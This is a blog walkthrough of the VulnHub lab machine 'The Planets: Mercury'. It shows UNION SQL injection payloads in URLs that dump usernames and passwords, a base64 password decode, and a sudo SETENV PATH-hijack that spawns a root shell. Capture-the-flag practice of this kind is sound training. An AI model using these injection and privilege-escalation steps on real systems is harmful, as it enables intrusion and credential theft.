---
layout: post
title:  "VulnHub - The Planets : Mercury"
categories: [vulnhub,walkthrough]
pin: true
tags: [sqli,path injection,sudo,base64]
image: /images/planet.jpg
---
- You’ll find this vm in Vulnhub `https://www.vulnhub.com/entry/the-planets-mercury,544/`

- Difficulty : Medium

## SQL injection
## Step 1
{% highlight sh %}
http://10.0.2.5:8080/mercuryfacts/1 UNION SELECT username from users--/
('john',), ('laura',), ('sam',), ('webmaster',))
{% endhighlight %}


## Step 2
{% highlight sh %}
http://10.0.2.5:8080/mercuryfacts/1 UNION SELECT password from users--/
 ('johnny1987',), ('lovemykids111',), ('lovemybeer111',), ('mercuryisthesizeof0.056Earths',))
{% endhighlight %}

## SSH webmaster, find encoded passwords
{% highlight sh %}
  cd mecury_proj/
  ls
  cat notes.txt
{% endhighlight %}

## Base64 decode the password
{% highlight sh %}
┌─[alienum@parrot]─[~/Desktop]
└──╼ $echo "bWVyY3VyeW1lYW5kaWFtZXRlcmlzNDg4MGttCg==" | base64 -d
mercurymeandiameteris4880km
{% endhighlight %}

## SSH linuxmaster

- linuxmaster:mercurymeandiameteris4880km

{% highlight sh %}
linuxmaster@mercury:~$ sudo -l
[sudo] password for linuxmaster:
Matching Defaults entries for linuxmaster on mercury:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User linuxmaster may run the following commands on mercury:
    (root : root) SETENV: /usr/bin/check_syslog.sh

linuxmaster@mercury:~$ cat /usr/bin/check_syslog.sh
#!/bin/bash
tail -n 10 /var/log/syslog
linuxmaster@mercury:~$ echo "/bin/bash" > tail
linuxmaster@mercury:~$ chmod 777 tail
linuxmaster@mercury:~$ export PATH=.:$PATH
linuxmaster@mercury:~$ sudo PATH=$PATH /usr/bin/check_syslog.sh
root@mercury:/home/linuxmaster#
{% endhighlight %}
